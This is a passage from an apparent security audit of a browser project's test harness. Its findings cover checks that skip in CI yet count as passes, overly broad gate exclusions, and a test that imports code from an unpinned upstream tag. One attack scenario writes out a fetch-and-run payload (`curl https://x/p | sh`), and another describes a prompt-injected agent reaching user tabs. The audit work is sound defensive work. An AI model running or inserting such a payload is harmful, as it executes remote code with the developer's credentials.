*Checked at:* scripts/verify-platform.sh:6977-6984 (exit-status-only PASS), :7066-7068 (FAIL-only extraction), :7199-7200 (green claim); scripts/verify-orca-credential-store-live.mjs:120; scripts/verify-no-remote-agent-port-live.mjs:286; scripts/verify-orca-pairing-containment.mjs:257; scripts/verify-orca-agent-status-live.mjs:200,395; scripts/verify-orca-slotless-start.mjs:179; .planning/WINDOWS.md:86 (entry 69)

### harness-driver-02: Lane-merge SKIP conditions stay in the shared prerequisites, so removing or renaming the agent allowlist turns the agent live rows into SKIP rather than FAIL

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/lib/orca-browser-live.mjs:56`
- **Category:** false-green

**What is wrong.** prerequisites() was written for a period when lanes p66-01..p66-03 were unmerged. After the merge it still treats the absence of the subject under test as a SKIP: no `const AGENT_METHODS =` in PowerBrowserAPI.sys.mjs, no theia/extensions/orca-browser, no pb-browser-host.js. orca-tabs-live's prerequisites do the same for theia/extensions/orca-panes. On a merged and built tree, a refactor that renames, moves or deletes AGENT_METHODS (the agent ability allowlist) or the orca-browser extension makes orca-browser-agent-live and orca-agent-mark-live print SKIP and exit 0. The driver counts that as PASS. The quick rows orca-browser-abilities and orca-browser-tab-scope still cover an empty AGENT_METHODS, so this is defence in depth rather than total loss.

**Scenario.** A change rewrites `const AGENT_METHODS = Object.freeze([` (PowerBrowserAPI.sys.mjs:11113) as `const AGENT_METHODS = new Set(...)` declared through a helper, or as `let`, or moves it to another module. The regex `/\bconst AGENT_METHODS\s*=/` no longer matches. orca-browser-agent-live then prints 'SKIP -- lane p66-03 not merged' and the gate records PASS, so the live proof of tab scope, the refusals and the agent container is never run.

**Evidence.** scripts/lib/orca-browser-live.mjs:55-57: `try { api = readFileSync(join(root, API_REL), 'utf8'); } catch {} if (!/\bconst AGENT_METHODS\s*=/.test(api)) return { skip: `lane p66-03 not merged (no AGENT_METHODS in ${API_REL})`, fail: null }; if (!existsSync(join(root, ORCA_BROWSER_REL))) return { skip: `lane p66-02 not merged ...` }`; scripts/lib/orca-tabs-live.mjs:91 `if (needPanes && !existsSync(join(root, ORCA_PANES_REL))) return { skip: 'lane p64-02 not merged ...' }`; verify-orca-browser-agent-live.mjs:1001 `if (pre.skip) { console.log(`${NAME}: SKIP -- ${pre.skip}`); return 0; }`.

**Suggested fix.** Now that the lanes are merged, make an absent AGENT_METHODS, an absent orca-browser or orca-panes extension, or an absent host bundle a FAIL in the shared prerequisites. Keep SKIP only for a missing build artefact (and see the driver SKIP finding).

**Verifier (CONFIRMED, medium).** scripts/lib/orca-browser-live.mjs:53-63 prerequisites() returns skip when `/\bconst AGENT_METHODS\s*=/` fails to match PowerBrowserAPI.sys.mjs, when theia/extensions/orca-browser is absent, or when pb-browser-host.js is absent. orca-tabs-live.mjs:91 does the same for orca-panes. verify-orca-browser-agent-live.mjs:1001 prints SKIP and returns 0. verify-orca-agent-mark-live.mjs:114 uses the same prerequisites. The driver loop (verify-platform.sh:6976-6990) judges only the exit status, so SKIP is recorded as PASS. Nothing in the driver turns a SKIP line red for these rows. The quick row orca-browser-abilities.mjs:212 uses a looser regex (`\bAGENT_METHODS\s*=`, accepting Object.freeze or new Set), and tab-scope checks the exported value. So a rename or deletion turns those quick rows red. A change from `const` to `let`, or a declaration through a helper, still passes the quick rows while the live security proof is skipped and counted PASS. This is a concrete defence-in-depth gap, not a total loss of coverage.

*Checked at:* scripts/lib/orca-browser-live.mjs:57; scripts/verify-orca-browser-agent-live.mjs:1001; scripts/verify-platform.sh:6976-6990 (exit status only). The partial guard is scripts/verify-orca-browser-abilities.mjs:212,252, which goes red on an absent or empty AGENT_METHODS, but its regex does not require `const`.

### harness-driver-03: CI never fetches orca/, so the Orca-derived clauses of the quick security rows print SKIP and pass on every push and fork PR

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `.github/workflows/verify.yml:93`
- **Category:** false-green

**What is wrong.** verify.yml fetches upstream/ and builds Theia, then runs the --quick table. It never runs scripts/fetch-orca.sh. Every quick v1.7 row that derives its expectation from the pinned Orca source therefore skips those clauses and exits 0: orca-credential-store (clauses 1-3, the plaintext override and temporary-key roots), orca-failure-classes (Orca's PairingOfferUnavailableReason and WebRuntimeAuthFailureReason), orca-browser-entry-points (the whole row SKIPs without orca/src), orca-mobile-protocol, orca-overlay's pinned-blob and replay steps, orca-pane-routes and orca-claude-sdk. The CI check that outside contributors see goes green without any Orca-side assertion, while the workflow header says it runs 'the whole --quick table'.

**Scenario.** A fork PR edits orca-overlay/seams.json or a PB file so that the credential-store override no longer matches Orca's pinned trigger value, or so that a new Orca failure reason is unmapped. In verify.yml, orca-credential-store and orca-failure-classes print 'SKIP of the pinned-source clauses only -- orca/ is not fetched' and pass, and the PR shows a green 'Verify static layers' check.

**Evidence.** .github/workflows/verify.yml:79-93: steps are generate, generate --check, `bash scripts/fetch-upstream.sh && bash scripts/apply-patches.sh`, Theia build, then `scripts/verify-platform.sh --quick`. No fetch-orca step. verify-orca-credential-store.mjs:170 `notes.push(`SKIP of the pinned-source clauses only -- ... 'orca/ is not fetched (bash scripts/fetch-orca.sh)'`)`; verify-orca-failure-classes.mjs:182 (same); verify-orca-browser-entry-points.mjs:659 `if (r.skips.length) { console.log(`${NAME}: SKIP -- ...`); return 0; }`; verify-orca-mobile-protocol.mjs:186 `if (r.skip) return { code: 0, ... SKIP ...}`.

**Suggested fix.** Add a `bash scripts/fetch-orca.sh` step to verify.yml before the table. It is pinned by commit, and the job's token is already read-only with persist-credentials false. Alternatively, fail a quick row in CI (CI=true) when orca/ is absent instead of skipping it.

**Verifier (CONFIRMED, medium).** verify.yml runs generate, generate --check, fetch-upstream plus apply-patches, the Theia build, then `verify-platform.sh --quick`. No step runs fetch-orca.sh; it appears only in release.yml and release-train.yml. orca/ is gitignored (.gitignore:44 `/orca/`) and no file under it is tracked, so a fresh CI checkout has no orca/. verify-orca-credential-store.mjs:170 and verify-orca-failure-classes.mjs:182 then add 'SKIP of the pinned-source clauses only -- orca/ is not fetched' and continue. verify-orca-browser-entry-points.mjs:659 exits 0 on any skip. The Orca-derived assertions therefore never run in push or fork-PR CI, and the check still shows green. The quick table runs in full; its Orca clauses SKIP by design. The gap is in CI coverage, and the local gate does run these clauses.

*Checked at:* .github/workflows/verify.yml:79-93 (no fetch-orca step); .gitignore:44; scripts/verify-orca-credential-store.mjs:170; scripts/verify-orca-failure-classes.mjs:182; scripts/verify-orca-browser-entry-points.mjs:659

### harness-driver-05: Gate exclusions keyed to WINDOWS 30 excuse seven rows the entry does not name, for any failure reason, until 'next version'

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-platform.sh:7116`
- **Category:** false-green
- **Owner decision cited:** D-59

**What is wrong.** Exclusions match on the label alone and accept any red reason while the ledger entry is open. WINDOWS 30 describes ten packaged rows that are red because no container release tarball exists, and it is re-dated to 'next version'. v1.7 keys seven more rows to it that its description does not list: orca-packaged-tree, orca-packaged-live, branding-variant-divergence, verify-branding-identity-release, build-update-xml, bundled-xpi-packaged and bundled-xpi-live. The 39-19 comment above the list says branding-variant-divergence and verify-branding-identity-release were removed because they pass. Entry 30 also already covers ng065-mar-signature-enforced (update integrity). Any new failure in these rows is printed as 'EXCLUDED (known-open)' and the gate exits 0, for example uBlock not blocking, a release identity regression, or MAR signatures not enforced once a tarball exists. bundled-xpi-live has a --dev mode on the dev objdir, so it could be run instead of excluded. real-input-gate-self-test is keyed to WINDOWS 69, whose own text says the rows 'have no GATE_KNOWN_OPEN_EXCLUSIONS row'.

**Scenario.** After the container tarball is built, bundled-xpi-live goes red because the distribution-directory XPI no longer blocks the derived rule, or ng065-mar-signature-enforced goes red because an unsigned MAR is applied. Both labels match an entry-30 exclusion, entry 30 is still 'open' (re-dated to next version), and --gate prints PASS-WITH-EXCLUSIONS.

**Evidence.** scripts/verify-platform.sh:7172-7176 `if [ "$label" = "$excl_label" ]; then ... if ledger_entry_is_open "$excl_ledger_id"; then echo "  EXCLUDED (known-open): ..."; excused=1`; :7108-7109 `"orca-packaged-tree|30|..."`, `"orca-packaged-live|30|..."`; :7116-7120 `"branding-variant-divergence|30|..."` ... `"bundled-xpi-live|30|..."`; :7089 `"ng065-mar-signature-enforced|30|..."`. WINDOWS.md entry 30 description lists only ng063-packaged-launch ... mar-update-hop. Entry 69: 'They are re-run, not excluded, and have no GATE_KNOWN_OPEN_EXCLUSIONS row'.

**Suggested fix.** Key each exclusion to the failure line it excuses (for example a required substring such as 'no container-built release tarball' or 'objdir-release absent'), so a different red in the same row stays red. Record the added rows in their own ledger entries rather than widening entry 30. Run bundled-xpi-live as --live --dev in the gate until the release objdir exists.

**Verifier (CONFIRMED, medium).** run_gate_mode (verify-platform.sh:7167-7180) matches a failing label against GATE_KNOWN_OPEN_EXCLUSIONS by exact label alone. If ledger_entry_is_open(id) holds, the row is excused whatever the failure reason. WINDOWS.md entry 30 (line 47) names exactly ten rows (ng063-packaged-launch ... mar-update-hop) and has status open, 'Re-dated to next version'. The list also keys orca-packaged-tree, orca-packaged-live (:7108-7109), branding-variant-divergence, verify-branding-identity-release, build-update-xml, bundled-xpi-packaged and bundled-xpi-live (:7116-7120) to entry 30, and none of these appear in its description. The 39-19 comment at the top of the list says branding-variant-divergence and verify-branding-identity-release were removed because they pass, yet they are listed again. real-input-gate-self-test is keyed to entry 69 (:7115), whose text says these rows 'are re-run, not excluded, and have no GATE_KNOWN_OPEN_EXCLUSIONS row'. verify-bundled-xpi.mjs supports `--live --dev` (:25,39), so the dev run is available. Any new red in these rows, including a security regression such as a bundled uBlock not blocking or the MAR signature check, is printed as EXCLUDED and the gate exits 0. The design keys on the ledger by intent (D-127), but the keying here is broader than what the ledger entries describe.

*Checked at:* scripts/verify-platform.sh:7073-7121 (list), 7167-7180 (label-only match); .planning/WINDOWS.md line 47 (entry 30's ten rows), line 86 (entry 69 'no GATE_KNOWN_OPEN_EXCLUSIONS row')

### harness-driver-06: redate-windows-self-test in --quick loads unpinned code from the developer's ~/.claude and cannot run in CI

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/redate-windows.mjs:15`
- **Category:** supply-chain

**What is wrong.** At import time the script requires broken-windows.cjs from GSD_BROKEN_WINDOWS or from ~/.claude/gsd-core/bin/lib/. Neither is in the repository or pinned. The row is registered in the --quick tier, which is the commit gate and the verify.yml CI table. In CI no gsd-core is installed, so require() throws and the row fails on every push: a permanent non-defect red that teaches readers to ignore the CI table. On a developer machine the commit gate executes whatever code sits at that home path, or at the path an inherited GSD_BROKEN_WINDOWS names, under the repo's verification authority.

**Scenario.** A fork PR or any push runs verify.yml. `node scripts/redate-windows.mjs --self-test` throws MODULE_NOT_FOUND for /home/runner/.claude/gsd-core/bin/lib/broken-windows.cjs and the --quick table is red for a reason unrelated to the change. Locally, a different gsd-core version with a changed renderLedger shape makes the gate depend on the developer's tool install, not the tree.

**Evidence.** scripts/redate-windows.mjs:15-17 `const BW_PATH = process.env.GSD_BROKEN_WINDOWS ?? path.join(os.homedir(), '.claude', 'gsd-core', 'bin', 'lib', 'broken-windows.cjs'); const bw = require(BW_PATH);`; scripts/verify-platform.sh:3680 `"redate-windows-self-test|node $REPO_ROOT/scripts/redate-windows.mjs --self-test"` inside the quick CHECKS; .github/workflows/verify.yml:93 runs `--quick`; no workflow references gsd-core.

**Suggested fix.** Move the row out of --quick, or vendor a pinned copy of the parser into the tree. Otherwise the row should print a named SKIP (with the SKIP verdict proposed above) when the tool is absent, and never require from an environment-supplied path in the commit gate.

**Verifier (CONFIRMED, medium).** redate-windows.mjs:15-17 runs require() at module top level on GSD_BROKEN_WINDOWS or ~/.claude/gsd-core/bin/lib/broken-windows.cjs. Neither is in the repository. The row redate-windows-self-test is registered at verify-platform.sh:3680 inside the base CHECKS array (:3659), which is the --quick tier, and verify.yml:93 runs --quick. No workflow references gsd-core or GSD_BROKEN_WINDOWS. On a GitHub runner, require throws MODULE_NOT_FOUND before any self-test code runs, so the row is red for a reason unrelated to any change. Locally the result depends on whatever gsd-core version is installed. The 'executes untrusted code' angle needs control of the developer's own home or environment, which is already full control, so it adds no severity. The severity rests on the permanent non-defect red in CI.

*Checked at:* scripts/redate-windows.mjs:15-17; scripts/verify-platform.sh:3659,3680; .github/workflows/verify.yml:93; grep of .github/ finds no gsd-core reference

### harness-static-hosting-01: Pin-derived security clauses SKIP in every CI job and the driver counts the SKIP as PASS; the Orca re-pin replay does not run them

- **Severity:** medium (reported as high)
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-credential-store.mjs:169`
- **Category:** false-green

**What is wrong.** The clauses that tie PowerBrowser's RUN-09 refusal and protection sentence to the pinned orcad (override name and trigger value, isTemporaryKeyDir roots, written key-record backends) run only when orca/ is fetched. Without it they push one SKIP note and the script exits 0 with a PASS line. The same pattern holds for orca-failure-classes clause 3 (Orca's reason unions), orca-offer-file's decode agreement with Orca's parser, orca-service clause 9 (pinned codes and port) and orca-mobile-protocol, which SKIPs whole. verify.yml (the CI --quick gate) fetches upstream/ and builds theia/ but never runs fetch-orca.sh. The run loop in verify-platform.sh marks a row PASS on exit 0 and does not look for SKIP lines. rebase-orca.sh, the only job that checks out a new Orca tag, runs ROWS=(orca-build-shape orca-overlay orca-overlay-built orca-mobile-protocol licence-allowlist orca-mobile-skew). That list leaves out orca-credential-store, orca-failure-classes, orca-offer-file and orca-service, and its skip_line refusal applies only to the listed rows. The self-tests that need typescript (credential-store:254, failure-classes:267) or orca/ (mobile-skew-self-test:422) also print SKIP and return 0. The live rows orca-pairing-containment (line 257) and orca-offer-scan (line 159) return 0 on a SKIP when there is no build, and the driver counts that as PASS too.

**Scenario.** An Orca re-pin moves to a tag where orcad-secret-key-resolution.ts writes { backend: 'os-keyring' }, or renames ORCA_HEADLESS_SECRET_STORE. rebase-orca.yml replays green because its ROWS skip orca-credential-store. The bump PR's verify.yml run has no orca/, so orca-credential-store prints 'SKIP of the pinned-source clauses only' and is summarised as PASS. The PR merges while the privacy.html protection sentence and the plaintext refusal are false at the new pin. Only a developer who happens to run --quick with orca/ fetched later sees the red.

**Evidence.** scripts/verify-orca-credential-store.mjs:169-171 `if (!existsSync(paths.orcaDir) || !ts) { notes.push(`SKIP of the pinned-source clauses only -- ...`) }`, then main prints notes and `process.exit(0)` (lines 333-339). scripts/verify-orca-failure-classes.mjs:181-182 has the same branch. scripts/verify-orca-offer-file.mjs:214-215 `passes.push(`SKIP decode agreement ...`)`. scripts/verify-orca-service.mjs:979-980. scripts/verify-orca-mobile-protocol.mjs:175 returns {skip}, and render gives code 0. scripts/verify-platform.sh:6977-6986 `wait "$CURRENT_CHECK_PID" || row_ok=0 ... SUMMARY+=("$label: PASS")`. .github/workflows/verify.yml:79-93 runs only fetch-upstream/apply-patches, theia install/build, then `verify-platform.sh --quick` (no fetch-orca.sh). scripts/rebase-orca.sh:50 `ROWS=(orca-build-shape orca-overlay orca-overlay-built orca-mobile-protocol licence-allowlist orca-mobile-skew)`.

**Suggested fix.** Add a fetch-orca.sh step (pinned tag and commit, no build) to verify.yml before the --quick table. Add orca-credential-store, orca-failure-classes, orca-offer-file and orca-service to rebase-orca.sh ROWS so the replay's skip_line refusal covers them. Make the driver treat a '<label>: SKIP' or 'SKIP of' line as red under --gate, or give these scripts a --require-pin flag that CI passes and that turns the SKIP into exit 1.

**Verifier (CONFIRMED, medium).** I traced every step of the claim and each one holds.

1. scripts/verify-orca-credential-store.mjs:168-171 checks for orca/ and typescript. When either is missing it pushes the note 'SKIP of the pinned-source clauses only' and skips the derivePinned clauses: the override name and trigger value from orcad-secret-key-resolution.ts, the isTemporaryKeyDir roots, and the written backends. Main (lines 332-339) prints the notes and, with no fails, prints PASS and calls process.exit(0). The same named-SKIP branches exist in verify-orca-failure-classes.mjs:180-182 (clause 3, Orca's reasons), verify-orca-offer-file.mjs:214-215 (decode agreement), verify-orca-service.mjs:979-980 (clause 9, pinned source) and verify-orca-mobile-protocol.mjs:175 (a whole-check skip).
2. The run loop in verify-platform.sh (6973-6990) decides a row only from the exit status of `wait` plus the orcad leak leg. It never scans the output for SKIP, so these rows are recorded as "label: PASS".
3. verify.yml runs on push and pull_request. It fetches upstream/, applies patches, builds theia/ and runs `verify-platform.sh --quick`. No workflow step runs fetch-orca.sh; grep finds fetch-orca only in release.yml and release-train.yml. typescript is installed in that job, so orca/ is the missing input and the SKIP branch is taken. The release.yml jobs that do fetch orca/ run only packaged-tree rows (line 212: ng063-packaged-launch ... orca-packaged-tree) and verify-orca-packaged-tree.mjs, not these rows.
4. scripts/rebase-orca.sh:50 sets ROWS to orca-build-shape, orca-overlay, orca-overlay-built, orca-mobile-protocol, licence-allowlist and orca-mobile-skew. stage_rows (218-226) applies the skip_line refusal only to those rows. orca-credential-store, orca-failure-classes, orca-offer-file and orca-service are not in the list. rebase-orca.yml:106 calls only rebase-orca.sh, and the replay never runs --quick.

Result: during an Orca re-pin, the replay job is the one CI job that has the new orca/ tree, and it never runs the clauses that tie the RUN-09 refusal and the privacy sentence to the pin. The bump PR's verify.yml run has no orca/, so those clauses SKIP and the rows read PASS. The clauses do go red when a developer runs them locally with orca/ fetched, so the check is not dead everywhere. I found no guard, and no owner decision in DECISIONS.md that accepts this.

Why medium, not high: the trigger is an upstream Orca change, not an attacker-controlled input. The checks work when orca/ is present, so this is a CI coverage gap in a defence-in-depth gate that has a concrete path (a silent rename of the plaintext override, or a backend drift), not a check that can never go red.

*Checked at:* scripts/verify-orca-credential-store.mjs:169-171 and 332-339 (SKIP note then exit 0 PASS); scripts/verify-platform.sh:6976-6990 (row PASS on exit status only); .github/workflows/verify.yml:79-93 (no fetch-orca.sh); scripts/rebase-orca.sh:50 and 218-226 (ROWS leaves out orca-credential-store, orca-failure-classes, orca-offer-file and orca-service; skip_line applies only to ROWS); .github/workflows/release.yml:211-213 (fetch-orca jobs run only packaged rows)

### harness-static-hosting-02: orca-mobile-skew runs TypeScript fetched from an unpinned upstream tag on the developer machine

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-mobile-protocol.mjs:343`
- **Category:** supply-chain

**What is wrong.** The --skew row lists every tag on the Orca remote and picks the newest mobile-android-vX.Y.Z by version number. It partially clones that tag, reads mobile/src/transport/protocol-version.ts with git show, writes the text to a .mts file and loads it with dynamic import(). Loading the file runs its top-level code with the developer's full environment. Nothing ties the tag to a reviewed commit: fetch-orca.sh pins the desktop tag and commit, but this tag is whichever is newest at run time. The row is in the full tier (verify-platform.sh:6781), so every plain `scripts/verify-platform.sh` or `--gate` run on a developer machine does this. It also runs in rebase-orca.sh ROWS.

**Scenario.** Someone who can push a tag to github.com/stablyai/orca (a compromised maintainer account or a compromised upstream repo, threat actor f) pushes mobile-android-v99.0.0. Its protocol-version.ts starts with `import { execSync } from 'node:child_process'; execSync('curl https://x/p | sh');` and exports the two integers. The next full verify run on a developer machine imports the file and runs the payload as the developer, with access to ~/.claude, SSH keys and the Cloudflare token file. No re-pin or review is needed.

**Evidence.** scripts/verify-orca-mobile-protocol.mjs:304-307 newestAppTag sorts the remote's tags and takes the highest. :361-364 `execFileSync('git', [... 'clone', ..., '--branch', tag, remote, dir])` then `git show HEAD:<rel>`. :339-343 `writeFileSync(file, text); ... m = await import(pathToFileURL(file).href);`. scripts/verify-platform.sh:6781 `"orca-mobile-skew|node $REPO_ROOT/scripts/verify-orca-mobile-protocol.mjs --skew"`.

**Suggested fix.** Do not execute the downloaded file. Get MOBILE_PROTOCOL_VERSION and MIN_COMPATIBLE_DESKTOP_VERSION with a strict regex or a TypeScript AST read of `export const NAME = <integer literal>`, and treat any other shape as 'constants file moved'. Keep import() only for the pinned tree's evaluateCompat.

**Verifier (CONFIRMED, medium).** I traced the whole path. runSkew (verify-orca-mobile-protocol.mjs:392-401) reads REMOTE from fetch-orca.sh, runs git ls-remote --tags, and newestAppTag (:304-308) takes the highest mobile-android-vX.Y.Z by integer order. Nothing pins it to a commit. appConstants (:361-364) does a depth-1 partial clone of that tag and git show HEAD:<rel>. constantsAt (:351-357) passes the text to importAppConstants (:339-343), which writes it to a .mts file and loads it with dynamic import(). Node type stripping runs the module's top-level code, a node:child_process import included, as the developer. Nothing sandboxes or vets the text before the import; the exports check comes only after it. The row is in the full tier (verify-platform.sh:6781) and in rebase-orca.sh:50 ROWS. The attacker must be able to push tags upstream (threat actor f), which is not the same as holding code execution on the developer machine: the desktop pin is commit-pinned and reviewed, and this tag is not.

*Checked at:* scripts/verify-orca-mobile-protocol.mjs:304-308, 339-343, 351-364, 399-401; scripts/verify-platform.sh:6781; scripts/rebase-orca.sh:50

### harness-static-hosting-03: runCollector turns a read() exception into a green sink whenever the control was found

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/lib/orca-offer-scan.mjs:223`
- **Category:** false-green

**What is wrong.** runCollector catches an exception from collector.read and sets unreadable = true, but leaves got as { chunks: [], faults: [] }. collectorLine reports unreadable only inside the blind branch. So when control() succeeds and read() throws, the result is 'control found, 0 matches' with no faults, which is green. Every needle and every fault that read() was building is discarded, including the bridge-folder mode faults and the stray-copy faults. The lib's own rule says an unread sink is never green, and this path breaks it.

**Scenario.** During the live pairing-containment run, bridgeFolderCollector runs while orcad is up. Its control reads web-pairing and passes. read() then lists the folder, and an entry is replaced between readdirSync and lstatSync (a writePrivateFile temp-then-rename, or the offer rewritten on reconnect), or a stray file is mode 0200, which passes the `(mode & 0o077) === 0` test, so readFileSync throws EACCES. read() throws, a 0644 web-pairing in the same folder or a second copy of the offer is never reported, and the sink prints 'sink bridge folder: control found, 0 matches'.

**Evidence.** scripts/lib/orca-offer-scan.mjs:222-224 `try { control = collector.control(ctx) === true; } catch { ... unreadable = true; } try { got = collector.read(ctx) ?? got; } catch { unreadable = true; } return { sink, blind: !control, matches: countMatches(got.chunks, ...), faults: got.faults ?? [], unreadable };`. :230 `if (r.blind) reasons.push(`collector blind (control not found${r.unreadable ? ', sink unreadable' : ''})`);` with no branch for `unreadable && !blind`. :436-442 bridgeFolderCollector.read calls lstatSync and readFileSync per entry without try/catch.

**Suggested fix.** In collectorLine, push a red reason ('sink unreadable') whenever r.unreadable is true, whatever the control result. In bridgeFolderCollector.read, catch each entry's lstat or read error and record it as a named fault instead of throwing.

**Verifier (CONFIRMED, medium).** runCollector (orca-offer-scan.mjs:218-224) catches a read() throw, sets unreadable, and keeps got = { chunks: [], faults: [] }. collectorLine (:228-236) uses unreadable only inside the blind branch. With control true and read() throwing, the result has no reasons and the line reads 'control found, 0 matches' (green). report() in verify-orca-pairing-containment.mjs:350-363 never reads r.unreadable either, so no later guard catches it. bridgeFolderCollector.read (:425-447) calls lstatSync(bridgeDir), lstatSync per entry and readFileSync per stray with no try/catch, so an entry removed between readdirSync and lstatSync (ENOENT), or a 0200 stray (passes (mode & 0o077) === 0, then EACCES on read), throws and drops every fault it had built. Whether such a throw happens in a live run is a runtime question, but the defect itself, an unread sink reported green, is in the code as described.

*Checked at:* scripts/lib/orca-offer-scan.mjs:218-236, 425-447; scripts/verify-orca-pairing-containment.mjs:350-363 (no unreadable check)

### harness-static-browser-01: Agent-hooks static clause misses process.env read through an alias, and the wrapper reads env only through an alias

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-agent-hooks.mjs:361`
- **Category:** false-green

**What is wrong.** The only guard for 'the wrapper reads no data root or pane identity name from process.env' is processEnvReads(). It matches only syntactic `process.env.X`, `process.env['X']` and `const {X} = process.env`. The shipped wrapper never reads `process.env.X` directly. It takes `main(argv, baseEnv = process.env, ...)` and reads `baseEnv.PATH` / `baseEnv.HOME`. A regression that reads `baseEnv.ORCA_USER_DATA_PATH` or `baseEnv.ORCA_PANE_KEY` is invisible to the static clause. The live stage B plants only ORCA_PLANT_63 in the launcher's environment, never a decoy ORCA_USER_DATA_PATH or ORCA_PANE_KEY, so the live row cannot catch it either. The self-test plant uses the literal `process.env.ORCA_USER_DATA_PATH`, so it passes without modelling the idiom the codebase actually uses.

**Scenario.** A developer edits claude-wrapper.mjs line 115 to `ORCA_USER_DATA: baseEnv.ORCA_USER_DATA_PATH ?? dataRoot`. VS Code was started from an Orca desktop terminal, so it inherits ORCA_USER_DATA_PATH=~/.config/orca. The wrapper then registers the Claude pane, and routes its hook relay, into the user's desktop Orca instead of PowerBrowser's orcad. orca-agent-hooks-self-test (quick) and orca-agent-hooks (full) both stay green.

**Evidence.** scripts/verify-orca-agent-hooks.mjs:358 `const isProcessEnv = (n) => ... n.name.text === 'env' && ... n.expression.text === 'process';` and :365-369 (only direct property/element/destructure of process.env). theia/extensions/orca-agents/bin/claude-wrapper.mjs:173 `export function main(argv, baseEnv = process.env, cwd = process.cwd())`, :115 `return { PATH: baseEnv.PATH ?? '', HOME: baseEnv.HOME ?? '', ORCA_USER_DATA: dataRoot, ...}`. Stage B env at :591 `{ PATH, HOME: home, [PLANT_NAME]: '1' }`. No ORCA_USER_DATA_PATH or ORCA_PANE_KEY decoy is planted.

**Suggested fix.** Make the live stage B plant decoy ORCA_USER_DATA_PATH, ORCA_USER_DATA, ORCA_PANE_KEY, ORCA_TAB_ID and ORCA_WORKTREE_ID pointing at a second scratch data root and a fake pane. Require that the pane appears in the PB data root and that the stub's identity is the real pane's. Statically, track identifiers bound to process.env (default parameters, const aliases, spreads) and flag forbidden member reads on them. Add a self-test plant in the `baseEnv.ORCA_USER_DATA_PATH` form.

**Verifier (CONFIRMED, medium).** processEnvReads (scripts/verify-orca-agent-hooks.mjs:361-379) matches only process.env.X, process.env['X'] and `const {..} = process.env`, through isProcessEnv at :358. The forbidden-name clause at :412-416 depends on that function alone. The shipped wrapper never names process.env except as the default parameter `main(argv, baseEnv = process.env, ...)` (claude-wrapper.mjs:173). It reads everything through baseEnv: cliEnv at :115 and claudeEnv at :97. A regression such as `baseEnv.ORCA_USER_DATA_PATH ?? dataRoot` is therefore invisible to the static clause. Stage B spawns the launcher with only PATH, HOME and ORCA_PLANT_63 (:591), so a fallback read finds nothing and still resolves to dataRoot, and the live stage stays green. The self-test plant at :781 uses the literal `process.env.ORCA_USER_DATA_PATH`, which models the idiom the wrapper does not use. No other guard covers this. The clause is vacuous against the code it exists to guard. Today the product is correct: claudeEnv strips every ORCA_ name and cliEnv uses dataRoot.

*Checked at:* scripts/verify-orca-agent-hooks.mjs:358,361-379,412-416,591,781; theia/extensions/orca-agents/bin/claude-wrapper.mjs:97,115,173

### harness-static-browser-02: Tab-scope wall is exercised only through the webTabAgent arm; no derived caller set for the page-work entry points

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-browser-tab-scope.mjs:326`
- **Category:** false-green

**What is wrong.** The check proves the wall only for requests that enter through the two sliced case arms of handleWebTabAction (webTabAgent, webTabAgentStop) and the webTabOpen arm. Nothing derives the set of call sites of the functions that do agent page work: agentRunInChild, AGENT_NATIVE_ROWS[...], getActor(AGENT_ACTOR_NAME), agentCookie*, agentScreenshot, agentAnswerDialog. Nothing requires that set to equal {handleWebTabAgent, AGENT_NATIVE_ROWS bodies}. A second entry point that calls any of them without agentWallVerdict is not detected. That includes a new action kind, a group-mutation arm, or a handler outside the agent section. Today there is exactly one caller (PowerBrowserAPI.sys.mjs:11774), so the gap is in the check, not yet in the product.

**Scenario.** A later change adds `case "webTabAgentScreenshot": return AGENT_NATIVE_ROWS['browser.screenshot'](webTabs.get(data.tabId), {}, data.tabId);` to handleWebTabAction, classified 'privileged' in KIND_CLASSES. A prompt-injected agent, or any frontend sender, can then screenshot a user tab. orca-browser-tab-scope and its self-test stay green, because the vm program only builds __actionArms from the webTabAgent and webTabAgentStop arms.

**Evidence.** scripts/verify-orca-browser-tab-scope.mjs:156 `const arms = ['webTabAgent', 'webTabAgentStop'].map(kind => caseText(functions.handleWebTabAction, kind));` and :328 `async function __actionArms(data, actorRef) { ... switch (kind) { ${sliced.arms} default: return null; } }`. Product: powerbrowser/shell/PowerBrowserAPI.sys.mjs:11714 `async function agentRunInChild(...)` (getActor at :11716), :11774 the only call `outcome = native ? await native(...) : await agentRunInChild(...)` behind the verdict at :11758-11761.

**Suggested fix.** Add a structural clause that parses PowerBrowserAPI.sys.mjs with acorn and derives every reference to agentRunInChild, AGENT_NATIVE_ROWS, the agent* page-work helpers and the AGENT_ACTOR_NAME/AGENT_RUN_MESSAGE constants. Require each to sit inside handleWebTabAgent or the AGENT_NATIVE_ROWS object, as set equality. Add a self-test plant that adds a second caller.

**Verifier (CONFIRMED, medium).** The vm program slices only the webTabAgent and webTabAgentStop arms of handleWebTabAction (:156) and the webTabOpen arm of handleGroupMutation (:159). __actionArms switches over just those arms (:328). The mechanism clause (:398-409) compares AGENT_NATIVE_ROWS keys with AGENT_METHODS and the child's keys. It does not compare call sites. No clause collects the references to agentRunInChild, AGENT_NATIVE_ROWS[...], getActor(AGENT_ACTOR_NAME), agentScreenshot, agentCookie* or agentAnswerDialog, or requires that set to equal the walled handler. In the product, the only page-work dispatch is at PowerBrowserAPI.sys.mjs:11773-11774, behind agentWallVerdict at :11758. That handler is reached from the case arm at :5592. The gap is in the check only. A new arm that calls AGENT_NATIVE_ROWS directly would not be detected. This breaks CLAUDE.md's derive-and-compare rule for a security wall.

*Checked at:* scripts/verify-orca-browser-tab-scope.mjs:156,159,328,398-409; powerbrowser/shell/PowerBrowserAPI.sys.mjs:5592,11758,11773-11774 (only caller today)

### harness-static-browser-03: orca-browser-abilities (a)-(g) and the whole of orca-browser-entry-points SKIP in CI and the driver counts the SKIP as PASS

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-orca-browser-entry-points.mjs:422`
- **Category:** false-green

